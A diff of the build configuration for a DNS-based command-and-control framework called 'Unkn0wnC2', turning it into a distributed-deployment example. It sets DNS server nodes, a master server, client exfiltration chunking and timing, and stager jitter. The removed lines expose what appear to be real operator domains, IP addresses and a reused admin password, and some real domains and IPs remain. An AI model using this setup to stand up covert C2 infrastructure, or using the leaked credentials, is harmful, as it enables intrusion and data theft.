@@ -1,9 +1,13 @@
 {
+  "_comment": "Example configuration for DISTRIBUTED (Shadow Mesh) deployment",
+  "_comment2": "Copy this to build_config.json and customize for your infrastructure",
+  
   "project": {
     "name": "Unkn0wnC2",
     "version": "0.2.0",
-    "description": "DNS-based Command & Control Framework"
+    "description": "DNS-based Command & Control Framework - Distributed Mode"
   },
+  
   "deployment": {
     "mode": "distributed",
     "dns_servers": [
@@ -21,33 +25,67 @@
       },
       {
         "id": "dns-2",
-        "domain": "errantshield.com",
-        "bind_addr": "10.100.0.2",
+        "domain": "example.com",
+        "bind_addr": "10.0.1.50",
         "bind_port": 53,
-        "server_address": "159.203.152.188",
-        "ns1": "ns1.errantshield.com",
-        "ns2": "ns2.errantshield.com",
+        "server_address": "203.0.113.10",
+        "ns1": "ns1.example.com",
+        "ns2": "ns2.example.com",
         "forward_dns": true,
-        "upstream_dns": "8.8.8.8:53",
+        "upstream_dns": "1.1.1.1:53",
+        "debug": false
+      },
+      {
+        "id": "dns-3",
+        "domain": "testdomain.org",
+        "bind_addr": "192.168.1.100",
+        "bind_port": 53,
+        "server_address": "198.51.100.20",
+        "ns1": "ns1.testdomain.org",
+        "ns2": "ns2.testdomain.org",
+        "forward_dns": true,
+        "upstream_dns": "8.8.4.4:53",
         "debug": false
       }
     ],
     "master": {
       "enabled": true,
-      "bind_addr": "172.26.13.62",
+      "bind_addr": "0.0.0.0",
       "bind_port": 8443,
-      "public_url": "https://secwolf.net:8443",
+      "public_url": "https://100.100.1.2:8443",
       "tls_cert": "certs/master.crt",
       "tls_key": "certs/master.key",
-      "jwt_secret": "!QAZ78fobh$*NC",
+      "jwt_secret": "CHANGE-THIS-TO-RANDOM-64-CHAR-STRING",
       "session_timeout": 480,
       "database_path": "master.db",
       "admin_username": "admin",
-      "admin_password": "!QAZ78fobh$*NC",
-      "debug": false
+      "admin_password": "CHANGE-THIS-STRONG-PASSWORD",
+      "debug": false,
+      "dns_servers_config": [
+        {
+          "id": "dns-1",
+          "domain": "secwolf.net",
+          "address": "https://dns-1.yourinfra.com:443",
+          "api_key": "CHANGE-THIS-API-KEY-1"
+        },
+        {
+          "id": "dns-2",
+          "domain": "example.com",
+          "address": "https://dns-2.yourinfra.com:443",
+          "api_key": "CHANGE-THIS-API-KEY-2"
+        },
+        {
+          "id": "dns-3",
+          "domain": "testdomain.org",
+          "address": "https://dns-3.yourinfra.com:443",
+          "api_key": "CHANGE-THIS-API-KEY-3"
+        }
+      ]
     }
   },
+  
   "server": {
+    "_comment": "Legacy config - kept for backwards compatibility",
     "bind_addr": "172.26.13.62",
     "bind_port": 53,
     "server_address": "98.90.218.70",
@@ -58,11 +96,13 @@
     "upstream_dns": "8.8.8.8:53",
     "debug": false
   },
+  
   "client": {
     "server_domain": "secwolf.net",
     "dns_domains": [
       "secwolf.net",
-      "errantshield.com"
+      "example.com",
+      "testdomain.org"
     ],
     "domain_selection_mode": "random",
     "dns_server": "",
@@ -78,6 +118,7 @@
     "exfil_chunks_per_burst": 5,
     "exfil_burst_pause_ms": 120000
   },
+  
   "stager": {
     "jitter_min_ms": 1000,
     "jitter_max_ms": 2000,
@@ -86,12 +127,20 @@
     "retry_delay_seconds": 3,
     "max_retries": 5
   },
+  
   "security": {
-    "encryption_key": "MySecretC2Key123!@#DefaultChange"
+    "encryption_key": "CHANGE-THIS-TO-STRONG-RANDOM-KEY-32-CHARS"
   },
+  
   "build": {
     "output_dir": "build",
     "targets": {
+      "master": {
+        "linux": {
+          "enabled": true,
+          "output": "master-server-linux"
+        }
+      },
       "server": {
         "linux": {
           "enabled": true,
